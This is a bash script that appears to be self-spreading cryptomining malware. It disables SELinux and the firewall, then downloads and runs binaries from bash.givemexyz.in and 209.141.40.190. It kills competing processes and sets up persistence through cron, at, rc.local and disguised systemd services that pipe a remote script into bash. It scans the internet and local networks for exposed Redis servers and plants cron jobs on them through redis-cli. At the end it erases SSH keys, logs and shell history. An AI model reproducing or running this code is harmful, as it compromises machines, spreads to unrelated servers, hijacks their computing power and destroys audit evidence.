 #!/bin/bash
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
setenforce 0 2>/dev/null
ulimit -u 50000
echo "" > /etc/ld.so.preload
iptables -F
echo "vm.nr_hugepages=$((1168+$(nproc)))" | tee -a /etc/sysctl.conf
sysctl -w vm.nr_hugepages=$((1168+$(nproc)))
echo '0' >/proc/sys/kernel/nmi_watchdog
echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf

rand=$(seq 0 255 | sort -R | head -n1)
rand2=$(seq 0 255 | sort -R | head -n1)

range=$(ip a | grep "BROADCAST\|inet" | grep -oP 'inet\s+\K\d{1,3}\.\d{1,3}' | grep -v 127 | grep -v inet6 |grep -v 255 | head -n1)
sys=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`

get() {
  chattr -i $2; rm -rf $2
  wget -q -O - $1 > $2 || curl -fsSL $1 -o $2 || python -c "import urllib; print urllib.urlopen('$1').read()" > $2 || lwp-download $1 $2 || wge -q -O - $1 > $2 || cur -fsSL $1 -o $2
  chmod +x $2
}

DIR=`cd /tmp || cd /var/tmp || cd /dev/shm || cd /root; pwd`

cd /tmp || cd /var/tmp || cd /dev/shm || cd /root


if [ $(ping -c 1 pool.supportxmr.com 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        dns=""
else
        dns="-d"
fi

if [ $(ping -c 1 bash.givemexyz.in 2>/dev/null|grep "bytes of data" | wc -l ) -gt '0' ];
then
        url="http://bash.givemexyz.in"
else
        url="http://209.141.40.190"
fi


ps -fe | grep dbused | grep -v grep; if [ $? -ne 0 ]; then
  get $url/$(uname -m) $DIR/dbused; chmod +x $DIR/dbused; $DIR/dbused -pwn; $DIR/dbused -c $dns; rm -rf $DIR/dbused
fi

ps -fe | grep bashirc | grep -v grep; if [ $? -ne 0 ]; then
  get $url/bashirc.$(uname -m) $DIR/bashirc; chmod +x $DIR/bashirc; $DIR/bashirc; rm -rf $DIR/bashirc
fi

function SetupNameServers(){  
grep 8.8.8.8 /etc/resolv.conf || echo 'nameserver 8.8.8.8' >> /etc/resolv.conf
grep 8.8.4.4 /etc/resolv.conf || echo 'nameserver 8.8.4.4' >> /etc/resolv.conf
}

SetupNameServers



kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
            ls -l /proc/$procid/exe | grep /tmp
            if [ $? -ne 1 ]
            then
                    cat /proc/$procid/cmdline| grep -a -E "dbused|dbusex|bashirc|hxx"
                    if [ $? -ne 0 ]
                    then
                            kill -9 $procid
                    else
                            echo "don't kill"
                    fi
            fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=40.0) print $1}' | while read procid
    do
            cat /proc/$procid/cmdline| grep -a -E "dbused|dbusex|bashirc|hxx"
            if [ $? -ne 0 ]
            then
                    kill -9 $procid
            else
                    echo "don't kill"
            fi
    done
}
kill_sus_proc


system_bin(){
  chattr -i /etc/crontab 
  rm -rf /bin/httpntp /bin/ftpsdns 
  sed -i '/httpgo/d' /etc/crontab 
  sed -i '/ftpsdns/d' /etc/crontab 
  echo -e "(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms\n##" > /bin/httpgo  
  chmod 755 /bin/httpgo
  get  $url/xms /usr/bin/bashgo
  chmod 755 /usr/bin/bashgo
  if [ ! -f "/etc/crontab" ]; then 
  echo -e "SHELL=/bin/sh\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\nMAILTO=root\nHOME=/\n# run-parts\n01 * * * * root run-parts /etc/cron.hourly\n02 4 * * * root run-parts /etc/cron.daily\n0 1 * * * root /bin/httpgo\n0 1 * * * root /bin/bashgo\n##" >> /etc/crontab 
  else 
  echo -e "0 1 * * * root /bin/httpgo\n0 1 * * * root /usr/bin/bashgo" >> /etc/crontab 
  fi
echo -ne "[Unit]
Description=System Function Loader
After=network.target

[Service]
ExecStart=/bin/bash /usr/bin/bashgo
Restart=always
RestartSec=10
Type=forking

[Install]
WantedBy=default.target" > /etc/systemd/system/bashgo.service
echo -ne "[Unit]
Description=System Functions Loader
After=network.target

[Service]
ExecStart=/bin/bash /usr/bin/httpgo
Restart=always
RestartSec=10
Type=forking

[Install]
WantedBy=default.target" > /etc/systemd/system/httpgo.service
  cp /etc/systemd/system/bashgo.service /usr/lib/systemd/system/bashgo.service
  cp /etc/systemd/system/httpgo.service /usr/lib/systemd/system/httpgo.service
  chmod +x /usr/lib/systemd/system/bashgo.service
  chmod +x /etc/systemd/system/bashgo.service
  chmod +x /usr/lib/systemd/system/httpgo.service
  chmod +x /etc/systemd/system/httpgo.service
  systemctl daemon-reload
  systemctl start bashgo.service
  systemctl start httpgo.service
  systemctl enable bashgo.service
  systemctl enable httpgo.service

}

cronhigh(){
  key="(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR"
  chattr -i /etc/cron.d/root /etc/cron.d/apache /var/spool/cron/root /var/spool/cron/crontabs/root 
  rm -rf /etc/cron.hourly/oanacroane /etc/cron.daily/oanacroane /etc/cron.monthly/oanacroane 
  mkdir -p /var/spool/cron/crontabs 
  mkdir -p /etc/cron.hourly 
  mkdir -p /etc/cron.daily 
  mkdir -p /etc/cron.monthly
  echo -e "* * * * * (curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms;\n##" >> /etc/cron.d/bashgo  
  echo -e "* * * * * (curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms\n##" >> /var/spool/cron/bashgo 
  echo -e "* * * * * (curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms\n##" >> /var/spool/cron/crontabs/bashgo
  if [ ! -f "/etc/cron.hourly/bashgo" ]; then 
   echo $key > /etc/cron.hourly/bashgo && chmod 755 /etc/cron.hourly/bashgo
  fi 
  if [ ! -f "/etc/cron.daily/bashgo" ]; then 
   echo $key > /etc/cron.daily/bashgo && chmod 755 /etc/cron.daily/bashgo 
  fi 
  if [ ! -f "/etc/cron.monthly/bashgo" ]; then 
    echo $key > /etc/cron.monthly/bashgo && chmod 755 /etc/cron.monthly/bashgo 
  fi
  echo $key > /etc/rc.local
  service rc.local start
}

cronbackup() {
 pay="(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR" 
 status=0 
 crona=$(systemctl is-active cron) 
 cronb=$(systemctl is-active crond) 
 cronatd=$(systemctl is-active atd) 
 if [ "$crona" == "active" ] ; then 
 echo "cron okay" 
 elif [ "$cronb" == "active" ]; then 
 echo "cron okay" 
 elif [ "$cronatd" == "active" ] ; then 
 status=1 
 else 
 status=2 
 fi 
 if [ $status -eq 1 ] ; then 
 for a in $(at -l|awk '{print $1}'); do at -r $a; done 
 echo "$pay" | at -m now + 1 minute 
 fi 
 if [ $status -eq 2 ] || [ "$me" != "root" ] ;then
  arr[0]="/dev/shm"
  arr[1]="/tmp"
  arr[2]="/var/tmp"
  arr[3]="/home/$(whoami)"
  arr[4]="/run/user/$(echo $UID)"
  arr[5]="/run/user/$(echo $UID)/systemd" 
  rand=$[$RANDOM % ${#arr[@]}]
 echo "Setting up custom backup" 
 ps auxf|grep -v grep|grep "cruner" | awk '{print $2}'|xargs kill -9 
 key="while true; do sleep 60 && $pay; done" 
 echo -e "$key\n##" > ${arr[$rand]}/cruner && chmod 777 ${arr[$rand]}/cruner 
 nohup ${arr[$rand]}/cruner >/dev/null 2>&1 &
 sleep 15 
 rm -rf ${arr[$rand]}/cruner 
 fi 
 } 

cron_low(){
  crontab -r
  rm -rf /dev/shm/.* /tmp/.* /var/tmp/.* /home/`whoami`/.* /run/user/"$(echo $UID)"/.* /run/user/"$(echo $UID)"/systemd/.*
  key2="(curl -fsSL $url/xms||wget -q -O- $url/xms||python -c 'import urllib2 as fbi;print fbi.urlopen(\"$url/xms\").read()')| bash -sh; lwp-download $url/xms $DIR/xms; bash $DIR/xms; $DIR/xms; rm -rf $DIR/xms"
  arr[0]="/dev/shm"
  arr[1]="/tmp"
  arr[2]="/var/tmp"
  arr[3]="/home/$(whoami)"
  arr[4]="/run/user/$(echo $UID)"
  arr[5]="/run/user/$(echo $UID)/systemd"
  rand=$[$RANDOM % ${#arr[@]}]
  rand1=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1`
  echo $key2 > ${arr[$rand]}/.$rand1
  chmod +x ${arr[$rand]}/.$rand1
  echo "* * * * * ${arr[$rand]}/.$rand1 >/dev/null 2>&1" | crontab -
}

if [ "$EUID" -ne 0 ]
then
  cron_low
  cronbackup
else
  cronbackup
  system_bin
  cronhigh
  cron_low
fi


install(){
  if [ -x "$(command -v apt-get)" ]; then
export DEBIAN_FRONTEND=noninteractive
apt-get update -y --exclude=procps* psmisc* 2>/dev/null
apt-get install -y debconf-doc 2>/dev/null 
apt-get install -y build-essential 2>/dev/null
apt-get install -y libpcap0.8-dev libpcap0.8 2>/dev/null
apt-get install -y libpcap* 2>/dev/null
apt-get install -y make 2>/dev/null
apt-get install -y gcc 2>/dev/null
apt-get install -y git 2>/dev/null
apt-get install -y redis-server 2>/dev/null
apt-get install -y redis-tools 2>/dev/null 
apt-get install -y redis 2>/dev/null 
apt-get install -y iptables 2>/dev/null
#apt-get install -y wget curl
apt-get install -y unhide 2>/dev/null
fi
if [ -x "$(command -v yum)" ]; then
yum update -y --exclude=procps* psmisc* 2>/dev/null
yum install -y epel-release 2>/dev/null
yum update -y --exclude=procps* psmisc* 2>/dev/null
yum install -y git 2>/dev/null
yum install -y iptables 2>/dev/null
yum install -y make 2>/dev/null
yum install -y gcc 2>/dev/null
yum install -y redis 2>/dev/null
yum install -y libpcap 2>/dev/null
yum install -y libpcap-devel 2>/dev/null
#yum install -y wget curl
yum install -y unhide 2>/dev/null
fi

if ! ( [ -x /usr/local/bin/pnscan ] || [ -x /usr/bin/pnscan ] ); then
    get ftp://ftp.lysator.liu.se/pub/unix/pnscan/pnscan-1.11.tar.gz $DIR/.x112
sleep 1
[ -f $DIR/.x112 ] && tar xf $DIR/.x112&& cd $DIR/pnscan-1.11 && make lnx && make install&& cd .. && rm -rf $DIR/pnscan-1.11 $DIR/.x112
echo "Pnscan Installed"
fi
if ! [ -x "$(command -v masscan)" ]; then
rm -rf /var/lib/apt/lists/*
rm -rf x1.tar.gz
sleep 1
get http://209.141.40.190/1.0.4.tar.gz $DIR/x1.tar.gz
sleep 1
[ -f $DIR/x1.tar.gz ] && tar zxf $DIR/x1.tar.gz && cd $DIR/masscan-1.0.4 && make && make install && cd .. && rm -rf masscan-1.0.4
echo "Masscan Installed"
fi
}
install

scanredis(){
ulimit -u 50000
sleep 1
iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2>/dev/null
iptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2>/dev/null
sleep 1
    if [ -f "/bin/ps.original" ]
    then
        ps.original -fe|grep pnscan |grep -v grep
    else
        ps -fe|grep pnscan |grep -v grep
    fi
if [ $? -ne 0 ]
then
  rm -rf .dat .shard .ranges .lan 2>/dev/null
  sleep 1
  echo 'config set dbfilename "backup.db"' > .dat
  echo 'save' >> .dat
  echo 'config set stop-writes-on-bgsave-error no' >> .dat
  echo 'flushall' >> .dat
  echo 'set backup2 "\n\n\n*/3 * * * * wget -q -O- http://209.141.40.190/xms | bash\n\n"' >> .dat
  echo 'set backup3 "\n\n\n*/4 * * * * curl -fsSL http://209.141.40.190/xms | bash\n\n"' >> .dat
  echo 'set backup4 "\n\n\n*/5 * * * * lwp-download http://209.141.40.190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n\n"' >> .dat
  echo 'config set dir "/var/spool/cron/"' >> .dat
  echo 'config set dbfilename "root"' >> .dat
  echo 'save' >> .dat
  echo 'config set dir "/var/spool/cron/crontabs"' >> .dat
  echo 'save' >> .dat
  echo 'flushall' >> .dat
  echo 'set backup2 "\n\n\n*/3 * * * * root wget -q -O- http://209.141.40.190/xms | bash\n\n"' >> .dat
  echo 'set backup3 "\n\n\n*/4 * * * * root curl -fsSL http://209.141.40.190/xms | bash\n\n"' >> .dat
  echo 'set backup4 "\n\n\n*/5 * * * * lwp-download http://209.141.40.190/xms /tmp/xms; bash /tmp/xms; rm -rf /tmp/xms\n\n"' >> .dat
  echo 'config set dir "/etc/cron.d/"' >> .dat
  echo 'config set dbfilename "hueh"' >> .dat
  echo 'save' >> .dat
  echo 'config set dir "/etc/"' >> .dat
  echo 'config set dbfilename "crontab"' >> .dat
  echo 'save' >> .dat
  sleep 1
  pnx=pnscan
  [ -x /usr/local/bin/pnscan ] && pnx=/usr/local/bin/pnscan
  [ -x /usr/bin/pnscan ] && pnx=/usr/bin/pnscan
  for z in $( seq 0 5000 | sort -R ); do
  for x in $( echo -e "47\n39\n8\n121\n106\n120\n123\n65\n3\n101\n139\n99\n63\n81\n44\n18\n119\n100\n42\n49\n118\n54\n1\n50\n114\n182\n52\n13\n34\n112\n115\n111\n116\n16\n35\n117\n124\n59\n36\n103\n82\n175\n122\n129\n45\n152\n159\n113\n15\n61\n180\n172\n157\n60\n218\n176\n58\n204\n140\n184\n150\n193\n223\n192\n75\n46\n188\n183\n222\n14\n104\n27\n221\n211\n132\n107\n43\n212\n148\n110\n62\n202\n95\n220\n154\n23\n149\n125\n210\n203\n185\n171\n146\n109\n94\n219\n134" | sort -R ); do
  for y in $( seq 0 255 | sort -R ); do
  $pnx -t256 -R '6f 73 3a 4c 69 6e 75 78' -W '2a 31 0d 0a 24 34 0d 0a 69 6e 66 6f 0d 0a' $x.$y.0.0/16 6379 > .r.$x.$y.o
  awk '/Linux/ {print $1, $3}' .r.$x.$y.o > .r.$x.$y.l
  while read -r h p; do
  cat .dat | redis-cli -h $h -p $p --raw &
  done < .r.$x.$y.l
  done
  done
        done
  sleep 1
  masscan --max-rate 10000 -p6379 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .shard
  sleep 1
  while read -r h p; do
  cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
  done < .shard
  sleep 1
  masscan --max-rate 10000 -p6379 10.0.0.0/8 172.16.0.0/12 192.168.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2>/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .ranges
  sleep 1
  while read -r h p; do
  cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
  done < .ranges
  sleep 1
  ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2>/dev/null | sed 's/\/\([0-9]\{2\}\)/\/16/g' > .inet
  sleep 1
  masscan --max-rate 10000 -p6379 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq > .lan
  sleep 1
  while read -r h p; do
  cat .dat | redis-cli -h $h -p $p --raw 2>/dev/null 1>/dev/null &
  done < .lan
  sleep 60
  rm -rf .dat .shard .ranges .lan 2>/dev/null
else
  echo "root runing....."
fi

}
scanredis



echo 0>/root/.ssh/authorized_keys >/dev/null
echo 0>/var/spool/mail/root >/dev/null
echo 0>/var/log/wtmp >/dev/null
echo 0>/var/log/secure >/dev/null
echo 0>/var/log/cron >/dev/null
echo 0>~/.bash_history >/dev/null
history -c 2>/dev/null 
